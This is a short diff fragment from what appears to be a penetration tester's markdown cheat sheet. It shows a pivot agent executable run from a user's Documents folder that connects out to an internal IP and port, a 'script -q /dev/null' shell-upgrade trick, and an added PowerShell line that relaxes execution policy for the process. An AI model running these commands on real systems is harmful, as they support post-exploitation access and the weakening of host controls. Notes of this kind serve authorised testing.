@@ -138,3 +138,9 @@ bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601
 ```bash 
 SHELL=/bin/bash script -q /dev/null
 ```
+
+#### EP
+
+```bash
+Set-ExecutionPolicy RemoteSigned –Scope Process
+```
